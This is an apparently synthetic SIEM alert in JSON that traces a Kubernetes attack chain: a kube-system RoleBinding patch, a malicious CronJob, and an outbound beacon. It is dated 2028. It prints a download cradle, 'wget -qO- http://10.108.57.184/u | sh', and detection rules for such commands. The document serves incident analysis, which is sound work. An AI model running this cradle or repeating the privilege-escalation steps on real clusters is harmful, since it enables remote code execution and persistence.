{
  "severity": "critical",
  "host_observations": [
    {"cluster": "corp-k8s-prod-01", "role": "k8s_control_plane_audit", "first_seen": "2028-01-19T11:08:17+0100", "last_seen": "2028-01-19T11:31:22+0100"},
    {"ip": "10.108.57.184", "inferred_role": "internal_attacker_payload_host", "first_seen": "2028-01-19T11:18:24+0100", "last_seen": "2028-01-19T11:31:22+0100"}
  ],
  "attack_progression": [
    {"step": 1, "tactic": "Persistence / Scheduled Task — K8s CronJob Created in kube-system", "technique": "T1053.007", "what_happened": "At 2028-01-19 11:08:17 CET, the Kubernetes API server audit log (ingested into Wazuh via the k8s-audit module) recorded: data.k8s.verb='create', data.k8s.resource='cronjobs', data.k8s.namespace='kube-system', data.k8s.objectRef.name='cleanup-job', data.k8s.user.username='ops-deploy@corp.local' (a normal-tier operator service account, NOT a cluster-admin), data.k8s.sourceIPs=['10.108.50.122']. The CronJob was created in the kube-system namespace — a system-reserved namespace where workload applications should NEVER deploy. The ops-deploy account does not normally have create permission on kube-system; its RBAC was modified ~5 minutes prior to grant it cronjob.create on kube-system (audit log shows the RoleBinding patch).", "chain_reason": "Wazuh custom rule 85100 'Kubernetes: CronJob created in system namespace' fired with rule.mitre.id=T1053.007 when k8s-audit verb=create + resource=cronjobs + namespace IN ('kube-system','kube-public','kube-node-lease'). Severity locked at high because system namespaces are admin-only by corp policy.", "first_seen": "2028-01-19T11:08:17+0100"},
    {"step": 2, "tactic": "Persistence / CronJob Spec Contains wget|sh Download Cradle", "technique": "T1053.007", "what_happened": "The CronJob spec captured in the audit log shows: schedule='*/10 * * * *' (every 10 minutes), jobTemplate.spec.containers[0].name='cleanup', .image='alpine:3.19' (a public Docker Hub image, NOT signed by the corp Cosign key and NOT in the corp registry corp.azurecr.io), .command=['sh','-c','wget -qO- http://10.108.57.184/u | sh']. The image pulled from public Docker Hub bypassed the corp admission policy (which is in audit mode rather than enforce). The container command is the literal wget|sh download cradle.", "chain_reason": "Wazuh custom rule 85101 'CronJob with public-registry image + wget|sh / curl|sh command' fired with rule.mitre.id=[T1053.007,T1105]. The corp admission controller should have rejected the unsigned image; it did not because Sigstore policy is in 'audit' mode for kube-system (deliberately permissive because system addons commonly come from public registries).", "first_seen": "2028-01-19T11:08:17+0100"},
    {"step": 3, "tactic": "Privilege Escalation / RoleBinding Modified Before CronJob Creation", "technique": "T1098", "what_happened": "At 11:03:42 CET (~5 minutes BEFORE the CronJob creation), the k8s audit log shows another action by data.k8s.user.username='cluster-admin@corp.local' (a real cluster-admin who legitimately has the right): verb='patch', resource='rolebindings', namespace='kube-system', objectRef.name='ops-deploy-elevated'. The patch added a new rule binding 'ops-deploy@corp.local' to a role with create permission on cronjobs in kube-system. This is suspicious because (a) no ServiceNow change ticket was open at 11:03:42 for an RBAC change, (b) the cluster-admin account itself may be compromised, (c) the elevated permission was used 5 minutes later by ops-deploy to create the malicious CronJob.", "chain_reason": "Wazuh custom rule 85102 'kube-system RoleBinding patch without change ticket' fired with rule.mitre.id=T1098 when verb=patch + resource IN (rolebindings,clusterrolebindings) + namespace='kube-system' AND no concurrent ServiceNow change ticket matches. The 5-minute gap between RBAC patch and CronJob creation is the privilege-escalation chain fingerprint.", "first_seen": "2028-01-19T11:03:42+0100"},
    {"step": 4, "tactic": "Command and Control — First CronJob Fire with Outbound Beacon", "technique": "T1071.001", "what_happened": "At 11:18:24 CET (~10 minutes after creation, matching the schedule '*/10'), the first Pod from cleanup-job CronJob was scheduled by kube-system's controller. The Pod ran on k8s-worker-22 (10.108.71.22). Linux auditd on the worker captured: data.audit.exe='/usr/bin/wget' inside the container's PID namespace, data.audit.command='wget -qO- http://10.108.57.184/u', data.audit.uid=0 (root inside container, root-mapped on node). Suricata logged outbound HTTP from data.srcip='10.108.71.22' (worker's NAT egress) to data.dstip='10.108.57.184' dstport=80. The container then piped the response into /bin/sh. The next fire would be at 11:28:24 — but the alert window catches just one fire.", "chain_reason": "Wazuh custom rule 85103 'CronJob pod outbound to non-corp internal IP within 60s of schedule fire' fired with rule.mitre.id=[T1071.001,T1105]. Cross-correlation: same dstip 10.108.57.184 + wget|sh signature + container origin from kube-system CronJob.", "first_seen": "2028-01-19T11:18:24+0100"}
  ],
  "time_window": {"start": "2028-01-19T11:03:42+0100", "end": "2028-01-19T11:31:22+0100"},
  "alert_count": 7,
  "unique_steps": 4
}
